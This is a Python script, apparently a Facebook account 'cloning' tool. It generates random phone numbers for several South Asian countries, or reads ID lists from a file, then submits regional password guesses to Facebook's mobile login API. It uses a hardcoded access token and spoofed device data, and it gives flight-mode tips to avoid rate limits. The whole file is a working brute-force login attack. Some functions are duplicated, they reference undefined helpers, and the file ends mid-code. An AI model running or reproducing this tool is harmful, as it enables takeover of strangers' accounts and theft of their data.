#__________________| IMPORT |__________________#
from os import path
import requests,random,uuid,string,hashlib,json
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,urllib3
import platform,math,smtplib
import platform
import smtplib
import math
import os,base64,zlib,pip,urllib
def clear():
        os.system('clear')
print(f'\x1b[38;5;8m[\x1b[1;97m=\x1b[38;5;8m]\x1b[38;5;46m INSTALLED SYSTEM ')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python xen.py')
       


#__________________| ETC |__________________#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'it_IT'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Telenor'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Telenor"
                        sim_id+=fbcr
        else:
                fbcr = 'Telenor'
                sim_id+=fbcr
except:
        fbcr = "Telenor"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
        
   

#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[]
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________| LINE |__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
import random

def ua_api():
    # 
    return f"FBAN/Mozilla; Android 10; Chrome 120.0.0.0; K AppleWebKit/537.36; Mobile Safari/537.36]"





#__________________| UA |__________________#


#__________________| LOGO |__________________#
logo=(f"""
 \033[1;32m     _|                  
\033[1;32m    |     __|  _ \   _ \ 
\033[1;32m    __|  |     __/   __/ 
\033[1;32m   _|   _|   \___| \___| 
                                                      

\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

\033[1;32m[\033[1;31m✓\033[1;32m] Author     : Simón 
\033[1;32m[\033[1;31m✓\033[1;32m] GitHub     : https://github.com/HiroshiYTz/HiroshiYTz
\033[1;32m[\033[1;31m✓\033[1;32m] Facebook.  : simón Trinidad
\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;33mFile × Random
\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;35m 0.1
\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________| MAIN |__________________#
def clear():
	os.system('clear')
	print(logo)
	

def menu():
        try:
              #  approval()
                        clear()
                        print(f'{G}[{A}1{G}]{G} FILE CLONING \n{G}[{A}2{G}]{G} RANDOM CLONING\n{G}[{A}3{G}]{G} CONTACT TOOL OWNER\n{G}[{A}0{G}]{G} EXIT TOOL')
                        linex()
                        xd=input(f'{G}[{A}?{G}]{A} CHOICE : ')
                        if xd in ['1','01']:
                                clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/xen.txt ');linex()
                                file = input(f'{G}[{A}?{G}]{G} FILE NAME : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]\n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]');linex()
                                mthd=input(f'{G}[{A}?{G}]{G} CHOICE : ')
                                clear()
                                plist = []
                                print(f'                  PASSWORD SYSTEM');linex();print(f'{G}[{A}1{G}]{G} AUTO PASSWORD CLONE\n{G}[{A}2{G}]{G} CHOICE PASSWORD CLONE');linex()
                                ppp=input(f'{G}[{A}?{G}]{G} CHOICE : ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('first12345')
                                        plist.append('First Last')
                                        plist.append('first786')
                                        plist.append('firstlast123')
                                        plist.append('firstlast786')
                                else:
                                        try:
                                                clear()
                                                ps_limit = int(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD LIMIT : '))
                                        except:
                                                ps_limit =1
                                        clear()
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : firstlast{G}/{G}first@@{G}/{G}first123 ')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD NO {i+1} :{A} '))
                                clear()
                                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] CP ID SHOW (y/n) ')
                                linex()
                                cx=input(f'{G}[{A}?{G}]{G} CHOICE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ACCOUNT :{A} '+total_ids+f' {G}<{A}-{G}> METHOD :{A} M{mthd}')
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api3,ids,names,passlist)
                                print('\033[1;37m')
                                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
                                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
                                menu()
                        elif xd in ['2','02']:
                                randm()
                        elif xd in ['3','03']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100057497148585');menu()
                        elif xd in ['0','05']:
                                exit(f'\033[1;32m[\033[1;31m✓\033[1;32m] BYE BYE ')
                        else:
                                exit(f'\033[1;32m[\033[1;31m✓\033[1;32m] OPTION NOT FOUND IN MENU...')
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] NO INTERNET CONNECTION...')
                exit()
#__________________| RANDOM |__________________#
def randm():
    clear()
    print(f'{G}[{A}1{G}]{G} BANGLADESH CLONING ')
    print(f'{G}[{A}2{G}]{G} INDIA CLONING ')
    print(f'{G}[{A}3{G}]{G} NEPAL CLONING ')
    print(f'{G}[{A}4{G}]{G} PAKISTAN CLONING ')
    print(f'{G}[{A}5{G}]{G} AFGHANISTAN CLONING ')
    print(f'{G}[{A}0{G}]{G} BACK TO MENU ');linex()
    option=input(f'{G}[{A}?{G}]{G} CHOICE : ')
    if option in ['1','A']:
        bd()
    elif option in ['2','B']:
    	india()
    elif option in ['3','C']:
    	nepal()
    elif option in ['4','D']:
    	pakistan()
    elif option in ['5','E']:
    	afghanistan()
    elif option in ['6','00']:
    	gmail()
    elif option in ['0','00']:
    	menu()
    else:
        exit(f'\033[1;32m[\033[1;31m✓\033[1;32m] BYE BYE ')
#__________________| BANGLADESH |__________________#
def bd():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 017 | 019 | 018 | 016 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp=''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()
#__________________| INDIA |__________________#
def india():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : +91639 | +91934 | +91902 | +91937 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid[:8],'57273200','59039200','57575751']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()
#__________________| NEPAL |__________________#
def nepal():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 9815 | 9814 | 9861 | 9840 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(6))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [uid,psx,uid[:8],uid[:7],uid[:6],'nepal123','nepal12345','nepal@123','magar','magar123','maya','maya123','pokhara','kumari','kathmandu','kathmandu123','tamang123','tamang']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()
		
#__________________| PAKISTAN |__________________#
def pakistan():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 0306 | 0335 | 0315 | 0345 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()
#__________________| AFGHANISTAN |__________________#
def afghanistan():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : +9340 | +9360 | +9330 | +9350');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()		
#__________________| FILE METHOD M1 |__________________#
def ク克隆():
    sintx_logo()
    E = "/sdcard/"
    prnt(pnl("[red][»] ENTER NAME OF YOUR FILE", width=90, style=_A))
    F = input(f"{yellow}  [+] /sdcard/:{dark_gray} ")
    G = E + F
    try:
        B = open(G, "r").read().splitlines()
    except FileNotFoundError:
        cd(1)
        print(f"\n{lr}  [X] FILE NOT FOUND")
        cd(3)
        ク克隆()
    A = []
    prnt(
        pnl(
            "[sky_blue1][1] SYSTEM PASSWORD LIST\n[2] YOUR PASSWORD LIST",
            width=90,
            style=_A,
            title="SELECT PASSWORD METHOD",
        )
    )
    H = input(f"{green}  [›] CHOICE:{dark_gray} ")
    if H in ["1", "01"]:
        A.append("first last")
        A.append("first123")
        A.append("first12")
        A.append("first143")
        A.append("first12345")
        A.append("first123456")
        A.append("first_123")
        A.append("maganda")
        A.append("magandaako")
        A.append("gandako")
        A.append("ganda")
        A.append("cuteako")
        A.append("god143")
        A.append("i love you")
        A.append("firstpretty")
        A.append("firstpogi")
        A.append("firstigop")
        A.append("firstdump")
        A.append("potanginamo")
        A.append("lastlast")
        A.append("firstfirst")
        A.append("firstganda")
        A.append("firstmaganda")
        A.append("blackpink")
        A.append("jungkook")
        A.append("pogiko")
        A.append("pogiako")
    else:
        try:
            prnt(
                pnl(
                    "[yellow][?] HOW MANY PASSWORD DO YOU WANT TO USE?",
                    width=90,
                    style=_A,
                )
            )
            C = int(input(f"{green}  [›] ANSWER:{dark_gray} "))
        except:
            C = 1
        prnt(
            pnl(
                "[yellow] first last, first123, first143, last123, last143",
                width=90,
                style=_A,
                title="EXAMPLE PASSWORD",
            )
        )
        for I in range(C):
            A.append(input(f"{green}  [›] PASSWORD #{I+1}:{dark_gray} "))
    with ThreadPool(max_workers=None) as J:
        prnt(
            pnl(
                "[yellow][»] ON/OFF FIRST YOUR DATA FOR 5 SECONDS AND PRESS ENTER",
                width=90,
                style=_A,
                title="INSTRUCTIONS",
            )
        )
        input(f"{green}  [»] PRESS ENTER: ")
        sintx_logo()
        D = str(len(B))
        prnt(
            pnl(
                "[yellow][»] NOT FOR SALE!",
                width=90,
                style=_A,
                title="NOTICE!",
            )
        )
        K = "[white][-] TOTAL IDS TO CLONE: " + D + "\n[-] RESULT PATH: SINTX FOLDER"
        prnt(pnl(K, width=90, style=_A, title="FILE INFO"))
        for L in B:
            M, N = L.split("|")
            O = A
            J.submit(sinsAPI_, M, N, O, D)
    P = "[»] HITS : " + str(len(oks))
    Q = "\n[»] CPS  : " + str(len(cps))
    print(_B)
    prnt(pnl(P + Q, width=90, style=_A, title="PROCESS COMPLETED"))
    input(f"{dark_gray}  [›] PRESS ENTER TO REFRESH ")
    sintx_menu()

#__________________| FILE METHOD M2 |__________________#
def ク克隆():
    sintx_logo()
    E = "/sdcard/"
    prnt(pnl("[red][»] ENTER NAME OF YOUR FILE", width=90, style=_A))
    F = input(f"{red}  [+] /sdcard/:{dark_gray} ")
    G = E + F
    try:
        B = open(G, "r").read().splitlines()
    except FileNotFoundError:
        cd(1)
        print(f"\n{lr}  [X] FILE NOT FOUND")
        cd(3)
        ク克隆()
    A = []
    prnt(
        pnl(
            "[sky_blue1][1] SYSTEM PASSWORD LIST\n[2] YOUR PASSWORD LIST",
            width=90,
            style=_A,
            title="SELECT PASSWORD METHOD",
        )
    )
    H = input(f"{red}  [›] CHOICE:{dark_gray} ")
    if H in ["1", "01"]:
        A.append("first last")
        A.append("first123")
        A.append("first12")
        A.append("first143")
        A.append("first12345")
        A.append("first123456")
        A.append("first_123")
        A.append("maganda")
        A.append("magandaako")
        A.append("gandako")
        A.append("ganda")
        A.append("cuteako")
        A.append("god143")
        A.append("i love you")
        A.append("firstpretty")
        A.append("firstpogi")
        A.append("firstigop")
        A.append("firstdump")
        A.append("potanginamo")
        A.append("lastlast")
        A.append("firstfirst")
        A.append("firstganda")
        A.append("firstmaganda")
        A.append("blackpink")
        A.append("jungkook")
        A.append("pogiko")
        A.append("pogiako")
    else:
        try:
            prnt(
                pnl(
                    "[yellow][?] HOW MANY PASSWORD DO YOU WANT TO USE?",
                    width=90,
                    style=_A,
                )
            )
            C = int(input(f"{green}  [›] ANSWER:{dark_gray} "))
        except:
            C = 1
        prnt(
            pnl(
                "[yellow] first last, first123, first143, last123, last143",
                width=90,
                style=_A,
                title="EXAMPLE PASSWORD",
            )
        )
        for I in range(C):
            A.append(input(f"{green}  [›] PASSWORD #{I+1}:{dark_gray} "))
    with ThreadPool(max_workers=None) as J:
        prnt(
            pnl(
                "[yellow][»] ON/OFF FIRST YOUR DATA FOR 5 SECONDS AND PRESS ENTER",
                width=90,
                style=_A,
                title="INSTRUCTIONS",
            )
        )
        input(f"{green}  [»] PRESS ENTER: ")
        sintx_logo()
        D = str(len(B))
        prnt(
            pnl(
                "[yellow][»] NOT FOR SALE!",
                width=90,
                style=_A,
                title="NOTICE!",
            )
        )
        K = "[white][-] TOTAL IDS TO CLONE: " + D + "\n[-] RESULT PATH: SINTX FOLDER"
        prnt(pnl(K, width=90, style=_A, title="FILE INFO"))
        for L in B:
            M, N = L.split("|")
            O = A
            J.submit(sinsAPI_, M, N, O, D)
    P = "[»] HITS : " + str(len(oks))
    Q = "\n[»] CPS  : " + str(len(cps))
    print(_B)
    prnt(pnl(P + Q, width=90, style=_A, title="PROCESS COMPLETED"))
    input(f"{dark_gray}  [›] PRESS ENTER TO REFRESH ")
    sintx_menu()
#__________________| RANDOM METHOD M1 |__________________#
def rndm1(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{G}[{R}HATS-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,450)}.0.0.{random.randint(11,60)}.{random.randint(70,200)}'
                        fbbv = str(random.randint(111111111,444444444))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        #mula = random.choice(["MT7-TL10", "MT7-TL00", "MT7-L09", "MT7-CL00", "MT7-UL00", "MT7-J1"])
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/ 187.0.0.34.81;FBBV/122154270;FBDM/{density=2'+'.0,width='+'720,height='+'1280};FBLC/en_US;FBRV/154662184;FBCR/Marshmallow;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-Z910F;FBSV/5.0.2;FBOP/1;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        device_id = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'device': 'Motorola',
                                "sim_country": "id",
                                "network_country": "id",
                                'app_version': '187.0.0.34.81',
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
